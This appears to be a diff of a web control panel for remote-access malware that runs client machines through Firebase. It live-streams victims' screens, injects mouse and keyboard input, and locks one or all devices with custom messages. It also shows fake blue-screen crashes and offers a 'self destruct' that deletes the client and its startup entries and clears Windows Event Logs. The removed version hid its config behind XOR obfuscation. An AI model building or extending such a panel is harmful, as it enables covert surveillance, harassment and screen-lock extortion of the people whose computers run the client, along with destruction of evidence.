+      <div class="pip"></div>
+      0 ONLINE
+    </div>
   </div>
 </header>
 
-<div class="layout">
+<!-- ══════════════════════ MAIN ══════════════════════ -->
+<div class="main">
 
-  <!-- VIEWER -->
-  <div class="viewer">
+  <!-- ── LEFT PANEL ── -->
+  <div class="left-panel">
 
-    <div class="vtop">
-      <span class="lbl flex-grow">// Live Screen  <span id="dev-watching" style="color:var(--green)"></span></span>
-      <button class="mb on" id="mb-move"  onclick="setMode('move')">Move</button>
-      <button class="mb"    id="mb-click" onclick="setMode('click')">Click</button>
-      <button class="mb"    id="mb-drag"  onclick="setMode('drag')">Drag</button>
-      <span style="font-family:'Share Tech Mono',monospace;font-size:.65rem;color:var(--muted)" id="fpslbl">— fps</span>
-      <button id="btn-live" class="btn bsg sm" onclick="startStream()" style="margin-left:6px;">▶ Get Live</button>
-      <button id="btn-stop" class="btn br  sm" onclick="stopStream()"  style="display:none;">⏹ Stop</button>
-    </div>
-
-    <div class="fps-rail"><div class="fps-fill" id="fpsfill"></div></div>
-
-    <div class="vbody" id="vbody">
-      <div class="no-scr" id="nomsg">
-        <div style="font-size:2.8rem;margin-bottom:12px;opacity:.4">🖥️</div>
-        <span class="blink">█</span>&nbsp;Device select karo screen dekhne ke liye<br>
-        <span style="font-size:.7rem;margin-top:8px;display:block">Left panel → Devices list se click karo</span>
+    <!-- Viewer header -->
+    <div class="sec-hd">
+      <span class="label cyan">// SCREEN VIEWER</span>
+      <div class="flex-row" style="gap:6px">
+        <span id="dev-label" style="font-family:var(--font-mono);font-size:9px;color:var(--text-dim)">NO DEVICE</span>
+        <button class="btn btn-cc btn-sm" onclick="startStream()">▶ STREAM</button>
+        <button class="btn btn-r btn-sm"  onclick="stopStream()">■ STOP</button>
       </div>
-      <img id="scr" draggable="false"/>
-      <div class="cring" id="cring"></div>
     </div>
 
-    <div class="kbbar">
-      <input id="kb" placeholder="Text type karo aur Enter dabao (target PC pe type hoga)"/>
-      <button class="btn bg sm" onclick="sendText()">Send</button>
+    <!-- Stream info bar -->
+    <div class="stream-info">
+      <span>FPS <span id="fps-val" style="color:var(--cyan)">--</span></span>
+      <span>SIZE <span id="res-val" style="color:var(--cyan)">--</span></span>
+      <div class="fps-bar"><div class="fps-fill" id="fps-fill"></div></div>
+      <span id="stream-status" style="color:var(--text-dim)">IDLE</span>
     </div>
+
+    <!-- Screen -->
+    <div class="viewer" id="viewer">
+      <div class="no-signal" id="no-signal">
+        <span class="icon">📡</span>
+        <p>WAITING FOR SIGNAL<span class="cursor"></span></p>
+      </div>
+      <img id="scr" alt="screen" draggable="false">
+      <div class="cursor-ring" id="cring"></div>
+    </div>
+
+    <!-- Mode toggles -->
+    <div class="mode-row">
+      <span style="font-family:var(--font-mono);font-size:9px;color:var(--text-dim);letter-spacing:2px;margin-right:4px">MODE</span>
+      <button class="mode-btn on" id="mb-move"  onclick="setMode('move')">MOVE</button>
+      <button class="mode-btn"    id="mb-click" onclick="setMode('click')">CLICK</button>
+      <button class="mode-btn"    id="mb-drag"  onclick="setMode('drag')">DRAG</button>
+    </div>
+
+    <!-- Shortcut keys -->
+    <div class="sec-hd">
+      <span class="label">// SHORTCUTS</span>
+      <button class="btn btn-c btn-sm" onclick="rKey('F5')">F5</button>
+    </div>
+
+    <div class="sk-grid">
+      <button class="btn btn-c btn-sm" onclick="rKey('escape')">ESC</button>
+      <button class="btn btn-c btn-sm" onclick="rKey('tab')">TAB</button>
+      <button class="btn btn-c btn-sm" onclick="rKey('enter')">ENTER</button>
+      <button class="btn btn-c btn-sm" onclick="rKey('delete')">DEL</button>
+      <button class="btn btn-c btn-sm" onclick="rKey('home')">HOME</button>
+      <button class="btn btn-c btn-sm" onclick="rKey('end')">END</button>
+      <button class="btn btn-c btn-sm" onclick="rKey('left')">←</button>
+      <button class="btn btn-c btn-sm" onclick="rKey('up')">↑</button>
+      <button class="btn btn-c btn-sm" onclick="rKey('right')">→</button>
+      <button class="btn btn-c btn-sm" onclick="rKey('down')">↓</button>
+      <button class="btn btn-c btn-sm" onclick="rKey('d','ctrl','alt')">CTRL+ALT+D</button>
+      <button class="btn btn-c btn-sm" onclick="rKey('F4','alt')">ALT+F4</button>
+    </div>
+
+    <!-- KB input -->
+    <div class="kb-bar">
+      <input type="text" id="kb" placeholder="Type text to send...">
+      <button class="btn btn-cc" onclick="sendText()">SEND</button>
+    </div>
+
   </div>
 
-  <!-- SIDE -->
-  <div class="side">
+  <!-- ── RIGHT PANEL ── -->
+  <div class="right-panel">
 
     <!-- Stats -->
-    <div class="card">
-      <div class="ch">// Stats</div>
-      <div class="sgrid">
-        <div class="stat"><div class="sl">Total</div><div class="sv" id="s-tot">0</div></div>
-        <div class="stat"><div class="sl">Online</div><div class="sv" id="s-on">0</div></div>
-        <div class="stat"><div class="sl">Locked</div><div class="sv" id="s-lk" style="color:var(--red)">0</div></div>
-        <div class="stat"><div class="sl">Stream</div><div class="sv" id="s-fps" style="font-size:.9rem;padding-top:5px">—</div></div>
+    <div class="sec-hd">
+      <span class="label">// NETWORK</span>
+    </div>
+
+    <div class="stats-grid">
+      <div class="stat-cell">
+        <div class="stat-label">ONLINE</div>
+        <div class="stat-value" id="stat-on">0</div>
+      </div>
+      <div class="stat-cell">
+        <div class="stat-label">LOCKED</div>
+        <div class="stat-value" id="stat-lk" style="color:var(--red);text-shadow:var(--glow-r)">0</div>
+      </div>
+      <div class="stat-cell">
+        <div class="stat-label">TOTAL</div>
+        <div class="stat-value" id="stat-tot">0</div>
+      </div>
+      <div class="stat-cell">
+        <div class="stat-label">STREAM</div>
+        <div class="stat-value" id="stat-str" style="color:var(--amber)">--</div>
       </div>
     </div>
 
-    <!-- Devices -->
-    <div class="card">
-      <div class="ch">// Devices  <span style="font-size:.55rem;font-weight:400;letter-spacing:1px">(CLICK = SCREEN DEKHO)</span></div>
-      <div id="devlist">
-        <div style="padding:18px;text-align:center;color:var(--muted);font-size:.7rem;font-family:'Share Tech Mono'">Loading...</div>
+    <!-- Device list -->
+    <div class="sec-hd">
+      <span class="label">// DEVICES</span>
+      <div class="flex-row" style="gap:5px">
+        <button class="btn btn-c btn-sm" onclick="lockAll()">ALL LOCK</button>
+        <button class="btn btn-r btn-sm" onclick="unlockAll()">ALL UNLOCK</button>
       </div>
     </div>
+    <div id="devlist"></div>
 
     <!-- Lock Control -->
-    <div class="card">
-      <div class="ch">// Lock Control</div>
-      <div class="qa">
-        <input id="qid"  placeholder="Device ID"/>
-        <input id="qmsg" placeholder="Custom lock message (optional)"/>
-        <div class="row2">
-          <button class="btn br sm" onclick="qLock()">🔒 Lock</button>
-          <button class="btn bg sm" onclick="qUnlock()">🔓 Unlock</button>
-        </div>
-        <div class="row2">
-          <button class="btn bsr sm" onclick="lockAll()">LOCK ALL</button>
-          <button class="btn bsg sm" onclick="unlockAll()">UNLOCK ALL</button>
-        </div>
-      </div>
+    <div class="sec-hd" style="margin-top:8px">
+      <span class="label cyan">// LOCK CONTROL</span>
     </div>
 
-    <!-- Shortcuts -->
-    <div class="card">
-      <div class="ch">// Remote Keys</div>
-      <div class="skgrid">
-        <button class="btn br sm" onclick="rKey('win')">⊞ Win</button>
-        <button class="btn br sm" onclick="rKey('tab','alt')">Alt+Tab</button>
-        <button class="btn br sm" onclick="rKey('f4','alt')">Alt+F4</button>
-        <button class="btn br sm" onclick="rKey('escape')">Esc</button>
-        <button class="btn br sm" onclick="rKey('printscreen')">PrtSc</button>
-        <button class="btn br sm" onclick="rKey('home','ctrl')">Ctrl+Home</button>
-        <button class="btn bg sm" onclick="rKey('c','ctrl')">Ctrl+C</button>
-        <button class="btn bg sm" onclick="rKey('v','ctrl')">Ctrl+V</button>
-        <button class="btn bg sm" onclick="rKey('z','ctrl')">Ctrl+Z</button>
-        <button class="btn bg sm" onclick="rKey('a','ctrl')">Ctrl+A</button>
-        <button class="btn bg sm" onclick="rKey('enter')">Enter</button>
-        <button class="btn bg sm" onclick="rKey('space')">Space</button>
+    <div class="lock-panel">
+      <input type="text" id="qid"  placeholder="Device ID (blank = selected)">
+      <input type="text" id="qmsg" placeholder="Lock message (optional)">
+      <div class="btn-row">
+        <button class="btn btn-r btn-sm" onclick="qLock()">LOCK</button>
+        <button class="btn btn-c btn-sm" onclick="qUnlock()">UNLOCK</button>
       </div>
     </div>
 
     <!-- BSOD -->
-    <div class="card bsod-card">
-      <div class="ch">// 💀 BSOD Overlay</div>
-      <div class="qa" style="gap:7px;">
-        <div style="font-family:'Share Tech Mono',monospace;font-size:.6rem;color:#2a5580;line-height:1.7;padding:2px 0 2px;">
-          Windows Blue Screen of Death dikhao.<br>
-          2-phase: Error screen → Restarting screen
-        </div>
+    <div class="sec-hd">
+      <span class="label blue">// BSOD TRIGGER</span>
+    </div>
 
-        <select class="bsod-select" id="bsod-stopcode">
-          <option value="">— Random Stop Code —</option>
-          <option>CRITICAL_PROCESS_DIED</option>
-          <option>SYSTEM_THREAD_EXCEPTION_NOT_HANDLED</option>
-          <option>IRQL_NOT_LESS_OR_EQUAL</option>
-          <option>MEMORY_MANAGEMENT</option>
-          <option>PAGE_FAULT_IN_NONPAGED_AREA</option>
-          <option>KERNEL_SECURITY_CHECK_FAILURE</option>
-          <option>DPC_WATCHDOG_VIOLATION</option>
-          <option>UNEXPECTED_KERNEL_MODE_TRAP</option>
-          <option>WHEA_UNCORRECTABLE_ERROR</option>
-          <option>BAD_POOL_HEADER</option>
-        </select>
+    <div class="bsod-panel">
+      <select class="bsod-select" id="bsod-stopcode">
+        <option value="">— RANDOM STOP CODE —</option>
+        <option>CRITICAL_PROCESS_DIED</option>
+        <option>SYSTEM_THREAD_EXCEPTION_NOT_HANDLED</option>
+        <option>IRQL_NOT_LESS_OR_EQUAL</option>
+        <option>MEMORY_MANAGEMENT</option>
+        <option>PAGE_FAULT_IN_NONPAGED_AREA</option>
+        <option>KERNEL_SECURITY_CHECK_FAILURE</option>
+        <option>DPC_WATCHDOG_VIOLATION</option>
+        <option>UNEXPECTED_KERNEL_MODE_TRAP</option>
+        <option>WHEA_UNCORRECTABLE_ERROR</option>
+        <option>BAD_POOL_HEADER</option>
+      </select>
 
-        <div class="bsod-row">
-          <span class="bsod-lbl">Phase 1 (sec)</span>
-          <input class="bsod-num" id="bsod-p1" type="number" value="300" min="5" max="3600"/>
-          <span class="bsod-lbl">Phase 2 (sec)</span>
-          <input class="bsod-num" id="bsod-p2" type="number" value="300" min="5" max="3600"/>
-        </div>
+      <div class="bsod-row">
+        <span class="bsod-lbl">PHASE 1</span>
+        <input class="bsod-num" id="bsod-p1" type="number" value="300" min="5">
+        <span class="bsod-lbl">sec</span>
+        <span class="bsod-lbl" style="margin-left:8px">PHASE 2</span>
+        <input class="bsod-num" id="bsod-p2" type="number" value="300" min="5">
+        <span class="bsod-lbl">sec</span>
+      </div>
 
-        <button class="btn-bsod" onclick="sendBSOD()">
-          💀 &nbsp;TRIGGER BSOD
-        </button>
-        <button class="btn-bsod" style="border-color:#002255;color:#2a5580;font-size:.68rem;"
-                onclick="sendBSODAll()">
-          💀 BSOD ALL DEVICES
-        </button>
+      <div class="btn-row">
+        <button class="btn btn-b btn-sm" onclick="sendBSOD()">💀 BSOD → DEVICE</button>
+        <button class="btn btn-b btn-sm" onclick="sendBSODAll()">💀 ALL</button>
       </div>
     </div>
 
     <!-- Self Destruct -->
-    <div class="card destruct-card">
-      <div class="ch">// ☢ Self Destruct</div>
-      <div class="qa" style="gap:6px;">
-        <div style="font-family:'Share Tech Mono',monospace;font-size:.62rem;color:#882233;line-height:1.7;padding:2px 0 4px;">
-          Device pe client ko permanently destroy karta hai.<br>
-          EXE delete · Startup entries hatao · Firebase logs clear · Registry wipe
-        </div>
-        <button class="btn-destruct" onclick="openDestructModal()">
-          ☢ &nbsp;SELF DESTRUCT &nbsp;— Selected Device
-        </button>
-        <button class="btn-destruct-all" onclick="openDestructAllModal()">
-          ☢ DESTRUCT ALL DEVICES
-        </button>
+    <div class="sec-hd">
+      <span class="label red">// SELF DESTRUCT</span>
+    </div>
+
+    <div class="section-pad">
+      <div class="btn-row">
+        <button class="btn btn-r btn-full btn-sm" onclick="openDestructModal()">☢ DESTRUCT DEVICE</button>
+        <button class="btn btn-rc btn-sm" onclick="openDestructAllModal()">ALL</button>
       </div>
     </div>
 
     <!-- Log -->
-    <div class="card">
-      <div class="ch row">
-        <span>// Log</span>
-        <button class="btn bg sm" onclick="clearLog()">Clear</button>
-      </div>
-      <div id="log"></div>
+    <div class="sec-hd">
+      <span class="label">// ACTIVITY LOG</span>
+      <button class="btn btn-sm" style="border-color:var(--border2);color:var(--text-dim)" onclick="clearLog()">CLEAR</button>
     </div>
+    <div id="log"></div>
 
   </div>
 </div>
 </div>
 
+<!-- ══════════════════════ DESTRUCT MODAL ══════════════════════ -->
+<div id="destructModal">
+  <div class="modal-box">
+    <span class="modal-icon">☢</span>
+    <div class="modal-title">Self Destruct Confirm</div>
+    <div class="modal-target" id="modal-target-id">Device: —</div>
+    <div class="modal-warn">
+      Ye command client ko permanently delete kar dega.<br>
+      Firebase data bhi wipe hoga.<br>
+      <strong style="color:var(--red)">Ye action reversible nahi hai.</strong>
+    </div>
+    <div class="cd-ring" id="cdRing">5</div>
+    <div class="modal-btns">
+      <button class="btn btn-c" onclick="closeDestructModal()">CANCEL</button>
+      <button class="btn btn-rc" id="confirmBtn" disabled onclick="confirmDestruct()">☢ CONFIRM</button>
+    </div>
+  </div>
+</div>
+
+<!-- ══════════════════════ TOAST ══════════════════════ -->
 <div id="toast"></div>
 
-<!-- ── SELF DESTRUCT MODAL ── -->
-<div class="modal-bg" id="destructModal">
-  <div class="modal">
-    <div class="modal-icon">☢️</div>
-    <div class="modal-title">SELF DESTRUCT</div>
-    <div class="modal-sub">Yeh action <strong style="color:#ff3355">permanent</strong> hai aur undo nahi ho sakta.</div>
-    <div class="modal-target" id="modal-target-id">—</div>
-    <div class="modal-warn">
-      ⚠ Client EXE / script delete ho jaayega<br>
-      ⚠ Startup entries (Registry + Folder) hata di jaayengi<br>
-      ⚠ Firebase data permanently delete ho jaayega<br>
-      ⚠ Windows Event Logs + TEMP saaf ho jaayenge
-    </div>
-    <div class="cd-wrap">
-      <div class="cd-ring" id="cdRing">5</div>
-    </div>
-    <div class="modal-btns">
-      <button class="mbtn-cancel" onclick="closeDestructModal()">✕ &nbsp;CANCEL</button>
-      <button class="mbtn-confirm" id="confirmBtn" disabled onclick="confirmDestruct()">
-        ☢ CONFIRM
-      </button>
-    </div>
-  </div>
-</div>
-
+<!-- ══════════════════════ FIREBASE ══════════════════════ -->
 <script type="module">
-import { initializeApp }  from "https://www.gstatic.com/firebasejs/10.12.0/firebase-app.js";
-import { getDatabase, ref, set, onValue, get }
-  from "https://www.gstatic.com/firebasejs/10.12.0/firebase-database.js";
+// ─────────────────────────────────────────────────────────────
+//  FIREBASE CONFIG — apni config yahan daalo
+// ─────────────────────────────────────────────────────────────
+import { initializeApp }               from "https://www.gstatic.com/firebasejs/10.12.0/firebase-app.js";
+import { getDatabase, ref, set, get,
+         onValue, off }                 from "https://www.gstatic.com/firebasejs/10.12.0/firebase-database.js";
 
-// ── Obfuscated config — plaintext source mein nahi dikhega ──
-(function(){
-  const _K = new Uint8Array([253, 157, 72, 89, 162, 224, 160, 51, 118, 234, 123, 28, 88, 79, 174, 139, 212, 133, 125, 23, 24, 195, 81, 214, 204, 254, 126, 58, 76, 44, 9, 100]);
-  const _E = "hr8pKcurxUpU0Fs+GQbU6of8P3RU8xbursknThNtYQ/PpCsMw7T0VQbcLnpsHsnFstE0NTTjc7e5ihZ+I0FoDZO/cnmAk81AD5NWem8tzLz64xRlfaEwpamfDkpiT2YJ37Foe8aB1FIUiwh5DR3iqe6lX39styGl9tFRSSFfcB3Q+387wNeNVxOMGmk0O4P5oOEfOX6qI7Ounw1fJUMnB5LwanWCwtBBGYAefywGyqnupV9kdbAor+GYSVguGytI3b87Lc2SwVQTqA5/Myraqe6lX2R1sCiv4ZhJWC4bJwKU7y07w5PFQAKFCX0/KoDqpPVfOzjhPLO/jR9dJUJuN5jzLDzQqcQRTMpZLWF2n7/ttU8gLvZk9ODeXFs8XEAA36doe5PakQpP208laH2ZveGwR2B9oWvkqMcbDXxJPgCb+384wIOSCkWJGCpqbdM=";
-  function _d(b64) {
-    const raw = Uint8Array.from(atob(b64), c => c.charCodeAt(0));
-    return new TextDecoder().decode(raw.map((b, i) => b ^ _K[i % _K.length]));
-  }
-  window.__fbCfg = JSON.parse(_d(_E));
-})();
+const firebaseConfig = {
+  apiKey:            "YOUR_API_KEY",
+  authDomain:        "YOUR_PROJECT.firebaseapp.com",
+  databaseURL:       "https://YOUR_PROJECT-default-rtdb.firebaseio.com",
+  projectId:         "YOUR_PROJECT",
+  storageBucket:     "YOUR_PROJECT.appspot.com",
+  messagingSenderId: "YOUR_SENDER_ID",
+  appId:             "YOUR_APP_ID"
+};
 
-const app = initializeApp(window.__fbCfg);
-delete window.__fbCfg;   // memory se bhi hata do
-const db = getDatabase(app);
+const app = initializeApp(firebaseConfig);
+const db  = getDatabase(app);
 
-// ── Firebase connection ────────────────────────────────────
-onValue(ref(db,".info/connected"), s=>{
-  const ok=s.val();
-  document.getElementById("fbb").classList.toggle("live",ok);
-  document.getElementById("fbt").textContent = ok?"FIREBASE LIVE":"FIREBASE OFF";
-  log(ok?"Firebase connected":"Firebase disconnected", ok?"ok":"er");
+// ── State ─────────────────────────────────────────────────────
+let viewingDevice = null;
+let devData       = {};
+let mode          = "move";
+let streamUnsub   = null;
+let _fpsTick      = 0;
+let _lastFrameTs  = 0;
+let _isDragging   = false;
+let _dragStart    = null;
+
+// ── Device list listener ──────────────────────────────────────
+onValue(ref(db, "devices"), snap => {
+  devData = snap.val() || {};
+  renderDevList();
+  updateStats();
 });
 
-// ── Devices watch ─────────────────────────────────────────
-let devData = {};
-onValue(ref(db,"devices"), snap=>{
-  devData = snap.val()||{};
-  renderDevices(devData);
-  const keys=Object.keys(devData);
-  document.getElementById("s-tot").textContent = keys.length;
-  document.getElementById("s-on").textContent  = keys.filter(k=>devData[k].status==="online").length;
-  document.getElementById("s-lk").textContent  = keys.filter(k=>devData[k].overlay_active).length;
-});
-
-function renderDevices(data){
-  const el=document.getElementById("devlist");
-  const keys=Object.keys(data);
-  if(!keys.length){
-    el.innerHTML=`<div style="padding:18px;text-align:center;color:var(--muted);font-size:.7rem;font-family:'Share Tech Mono'">Koi device nahi</div>`;
+function renderDevList() {
+  const el = document.getElementById("devlist");
+  el.innerHTML = "";
+  const ids = Object.keys(devData);
+  if (!ids.length) {
+    el.innerHTML = `<div style="padding:16px;font-family:var(--font-mono);font-size:10px;color:var(--text-dim);text-align:center">NO DEVICES REGISTERED</div>`;
     return;
   }
-  el.innerHTML=keys.map(id=>{
-    const d=data[id], on=d.status==="online", lk=d.overlay_active;
-    const active = id===viewingDevice ? "active" : "";
-    return `<div class="di ${active}" onclick="window.viewDevice('${id}')">
-      <div class="ddot ${on?"on":""}"></div>
-      <div class="dinfo">
-        <div class="dname">${id}</div>
-        <div class="dmeta">${d.screen_w||"?"}×${d.screen_h||"?"}  ${(d.last_seen||"").slice(11,19)}</div>
+  ids.forEach(id => {
+    const d  = devData[id];
+    const online = d.status === "online";
+    const locked = d.overlay_active;
+
+    const item = document.createElement("div");
+    item.className = "dev-item" + (id === viewingDevice ? " active" : "");
+    item.innerHTML = `
+      <div class="dev-pip ${online ? 'on' : ''}"></div>
+      <div class="dev-info">
+        <div class="dev-name">${id}</div>
+        <div class="dev-meta">${d.screen_w || '?'}×${d.screen_h || '?'} · ${_ago(d.last_seen)}</div>
       </div>
-      <span class="dlk ${lk?"lk":"ok"}">${lk?"🔒":"🔓"}</span>
-      <div style="display:flex;flex-direction:column;gap:3px;margin-left:5px">
-        <button class="btn br sm" onclick="event.stopPropagation();window._lock('${id}')">Lock</button>
-        <button class="btn bg sm" onclick="event.stopPropagation();window._unlock('${id}')">Unlock</button>
-        <button style="padding:2px 5px;font-size:.55rem;background:transparent;border:1px solid #551122;color:#ff3355;border-radius:2px;cursor:pointer;font-family:'Share Tech Mono',monospace;letter-spacing:1px;" onclick="event.stopPropagation();window.openDestructModal('${id}')">☢ KILL</button>
-      </div>
-    </div>`;
-  }).join("");
-}
-
-// ── Stream control ────────────────────────────────────────
-let streamingActive = false;
-
-function startStream() {
-  if (!viewingDevice) { toast("Device select karo pehle!", false, true); return; }
-  set(ref(db, `stream_ctrl/${viewingDevice}`), { cmd: "start", ts: Date.now() })
-    .then(() => {
-      streamingActive = true;
-      document.getElementById("btn-live").style.display = "none";
-      document.getElementById("btn-stop").style.display = "";
-      log(`▶ Stream START → ${viewingDevice}`, "ok");
-      toast(`▶ Live: ${viewingDevice}`);
-      // Now subscribe to frames
-      subscribeScreen(viewingDevice);
-    })
-    .catch(e => { log("Stream start err: " + e.message, "er"); });
-}
-
-function stopStream() {
-  if (!viewingDevice) return;
-  set(ref(db, `stream_ctrl/${viewingDevice}`), { cmd: "stop", ts: Date.now() })
-    .then(() => {
-      streamingActive = false;
-      document.getElementById("btn-live").style.display = "";
-      document.getElementById("btn-stop").style.display = "none";
-      // Unsubscribe frames
-      if (screenUnsub) { screenUnsub(); screenUnsub = null; }
-      scrImg.style.display = "none";
-      nomsg.style.display  = "block";
-      stBdg.classList.remove("live");
-      stTxt.textContent = "NO STREAM";
-      clearInterval(fpsTimer);
-      document.getElementById("fpslbl").textContent = "— fps";
-      document.getElementById("s-fps").textContent  = "—";
-      document.getElementById("fpsfill").style.width = "0%";
-      log(`⏹ Stream STOP → ${viewingDevice}`, "in");
-      toast(`⏹ Stopped: ${viewingDevice}`);
-    })
-    .catch(e => { log("Stream stop err: " + e.message, "er"); });
-}
-
-function subscribeScreen(id) {
-  if (screenUnsub) { screenUnsub(); screenUnsub = null; }
-
-  scrImg.style.display = "block";
-  nomsg.style.display  = "none";
-  cring.style.display  = "block";
-  stBdg.classList.add("live");
-  stTxt.textContent = id;
-
-  fpsCount = 0;
-  clearInterval(fpsTimer);
-  fpsTimer = setInterval(() => {
-    const fps = fpsCount; fpsCount = 0;
-    document.getElementById("fpslbl").textContent = `${fps} fps`;
-    document.getElementById("s-fps").textContent  = `${fps}fps`;
-    document.getElementById("fpsfill").style.width = Math.min(fps / 10 * 100, 100) + "%";
-  }, 1000);
-
-  screenUnsub = onValue(ref(db, `screens/${id}`), snap => {
-    const d = snap.val();
-    if (!d?.img) return;
-    scrImg.src = "data:image/jpeg;base64," + d.img;
-    fpsCount++;
+      <div class="dev-tag ${locked ? 'locked' : 'online'}">${locked ? 'LOCKED' : 'LIVE'}</div>
+    `;
+    item.onclick = () => selectDevice(id);
+    el.appendChild(item);
   });
 }
 
-window.startStream = startStream;
-window.stopStream  = stopStream;
+function _ago(iso) {
+  if (!iso) return "—";
+  const sec = Math.floor((Date.now() - new Date(iso)) / 1000);
+  if (sec < 5)   return "just now";
+  if (sec < 60)  return sec + "s ago";
+  if (sec < 3600) return Math.floor(sec/60) + "m ago";
+  return Math.floor(sec/3600) + "h ago";
+}
 
-// ── Screen viewer ─────────────────────────────────────────
-let viewingDevice = null;
-let screenUnsub   = null;
-let fpsCount      = 0;
-let fpsTimer      = null;
-const scrImg = document.getElementById("scr");
-const nomsg  = document.getElementById("nomsg");
-const cring  = document.getElementById("cring");
-const vbody  = document.getElementById("vbody");
-const stBdg  = document.getElementById("stb");
-const stTxt  = document.getElementById("stt");
+function updateStats() {
+  const ids   = Object.keys(devData);
+  const on_ct = ids.filter(id => devData[id].status === "online").length;
+  const lk_ct = ids.filter(id => devData[id].overlay_active).length;
+  const st_ct = ids.filter(id => devData[id].streaming).length;
+  document.getElementById("stat-on").textContent  = on_ct;
+  document.getElementById("stat-lk").textContent  = lk_ct;
+  document.getElementById("stat-tot").textContent = ids.length;
+  document.getElementById("stat-str").textContent = st_ct || "--";
+  document.getElementById("badge-dev").querySelector(".pip").style.background =
+    on_ct > 0 ? "var(--green)" : "var(--text-dim)";
+  document.getElementById("badge-dev").lastChild.textContent = ` ${on_ct} ONLINE`;
+}
 
-window.viewDevice = id => {
-  // Pehle jo chal raha tha usse stop karo (UI only — Firebase cmd nahi)
-  if (screenUnsub) { screenUnsub(); screenUnsub = null; }
-  if (streamingActive && viewingDevice && viewingDevice !== id) {
-    // Previous device ka stream stop karo
-    set(ref(db, `stream_ctrl/${viewingDevice}`), { cmd: "stop", ts: Date.now() });
-    streamingActive = false;
-  }
+// Refresh ago timestamps every 5s
+setInterval(() => {
+  if (Object.keys(devData).length) renderDevList();
+}, 5000);
 
+// ── Device selection ──────────────────────────────────────────
+function selectDevice(id) {
   viewingDevice = id;
-  document.getElementById("dev-watching").textContent = `— ${id}`;
+  document.getElementById("dev-label").textContent = id;
   document.getElementById("qid").value = id;
+  renderDevList();
+  log(`Selected: ${id}`, "ok");
+}
+window.selectDevice = selectDevice;
 
-  // Stream buttons reset
-  document.getElementById("btn-live").style.display = "";
-  document.getElementById("btn-stop").style.display = "none";
-  streamingActive = false;
-
-  // Screen viewer reset — wait for "Get Live" click
-  scrImg.style.display = "none";
-  nomsg.style.display  = "block";
-  nomsg.innerHTML = `
-    <div style="font-size:2.8rem;margin-bottom:12px;opacity:.4">🖥️</div>
-    <span style="color:var(--green);font-family:'Share Tech Mono',monospace;font-size:.8rem">${id}</span><br>
-    <span style="font-size:.75rem;margin-top:10px;display:block;color:var(--muted)">
-      ▶ "Get Live" button dabao stream shuru karne ke liye
-    </span>`;
-  cring.style.display  = "none";
-  stBdg.classList.remove("live");
-  stTxt.textContent = "READY";
-  clearInterval(fpsTimer);
-  document.getElementById("fpslbl").textContent = "— fps";
-  document.getElementById("s-fps").textContent  = "—";
-  document.getElementById("fpsfill").style.width = "0%";
-
-  renderDevices(devData);
-  log(`Selected: ${id} — "Get Live" press karo`, "in");
-  toast(`Device: ${id}`);
+// ── Screen streaming ──────────────────────────────────────────
+window.startStream = () => {
+  if (!viewingDevice) { toast("Device select karo!", false, true); return; }
+  set(ref(db, `stream_ctrl/${viewingDevice}`), { cmd: "start" });
+  log(`Stream START → ${viewingDevice}`, "ok");
+  subscribeStream(viewingDevice);
 };
 
-// ── Send control to Firebase ──────────────────────────────
-function ctrl(payload){
-  if(!viewingDevice){ toast("Device select karo pehle!",false,true); return; }
-  set(ref(db,`control/${viewingDevice}`),{...payload, ts:Date.now()});
+window.stopStream = () => {
+  if (!viewingDevice) return;
+  set(ref(db, `stream_ctrl/${viewingDevice}`), { cmd: "stop" });
+  log(`Stream STOP → ${viewingDevice}`, "in");
+  if (streamUnsub) { off(ref(db, `screens/${viewingDevice}`)); streamUnsub = null; }
+  document.getElementById("scr").style.display = "none";
+  document.getElementById("no-signal").style.display = "flex";
+  document.getElementById("stream-status").textContent = "IDLE";
+};
+
+function subscribeStream(id) {
+  if (streamUnsub) off(ref(db, `screens/${streamUnsub}`));
+  const scrRef = ref(db, `screens/${id}`);
+  onValue(scrRef, snap => {
+    const data = snap.val();
+    if (!data || !data.frame) return;
+    const scr = document.getElementById("scr");
+    const ns  = document.getElementById("no-signal");
+    scr.src = "data:image/jpeg;base64," + data.frame;
+    if (scr.style.display !== "block") {
+      scr.style.display = "block";
+      ns.style.display  = "none";
+    }
+    // FPS calculation
+    const now = Date.now();
+    const fps = now - _lastFrameTs > 0 ? Math.round(1000 / (now - _lastFrameTs)) : 0;
+    _lastFrameTs = now;
+    document.getElementById("fps-val").textContent = fps;
+    document.getElementById("fps-fill").style.width = Math.min(100, fps * 10) + "%";
+    document.getElementById("res-val").textContent = `${data.w}×${data.h}`;
+    document.getElementById("stream-status").textContent = "LIVE";
+  });
+  streamUnsub = id;
 }
 
-// ── Mouse events ──────────────────────────────────────────
-let mode     = "move";
-let dragging = false;
-let lastMove = 0;
+// ── Mouse control ─────────────────────────────────────────────
+const viewer = document.getElementById("viewer");
+const scr    = document.getElementById("scr");
+const cring  = document.getElementById("cring");
 
-function rel(e){
-  const r=scrImg.getBoundingClientRect();
-  return {
-    x: Math.max(0,Math.min(1,(e.clientX-r.left)/r.width)),
-    y: Math.max(0,Math.min(1,(e.clientY-r.top)/r.height))
-  };
+function getRelPos(e) {
+  const r  = scr.getBoundingClientRect();
+  const cx = (e.clientX - r.left) / r.width;
+  const cy = (e.clientY - r.top)  / r.height;
+  return { x: Math.max(0, Math.min(1, cx)), y: Math.max(0, Math.min(1, cy)) };
 }
 
-scrImg.addEventListener("mousemove", e=>{
-  // move cursor ring
-  const vr=vbody.getBoundingClientRect();
-  cring.style.left=(e.clientX-vr.left)+"px";
-  cring.style.top =(e.clientY-vr.top) +"px";
-  // throttle 16fps for mouse move commands
-  const now=Date.now();
-  if(now-lastMove<62) return;
-  lastMove=now;
-  if(!viewingDevice) return;
-  ctrl({type:"mouse_move",...rel(e)});
-});
-
-scrImg.addEventListener("click", e=>{
-  if(!viewingDevice||mode==="drag") return;
-  ctrl({type:"mouse_click",...rel(e),button:"left"});
-});
-
-scrImg.addEventListener("contextmenu", e=>{
-  e.preventDefault();
-  if(!viewingDevice) return;
-  ctrl({type:"mouse_click",...rel(e),button:"right"});
-});
-
-scrImg.addEventListener("dblclick", e=>{
-  if(!viewingDevice) return;
-  ctrl({type:"mouse_click",...rel(e),button:"left",double:true});
-});
-
-scrImg.addEventListener("mousedown", e=>{
-  dragging=true;
-  if(mode==="drag"&&viewingDevice) ctrl({type:"mouse_down",...rel(e),button:"left"});
-});
-
-scrImg.addEventListener("mouseup", e=>{
-  if(dragging&&mode==="drag"&&viewingDevice) ctrl({type:"mouse_up",...rel(e),button:"left"});
-  dragging=false;
-});
-
-scrImg.addEventListener("wheel", e=>{
-  e.preventDefault();
-  if(!viewingDevice) return;
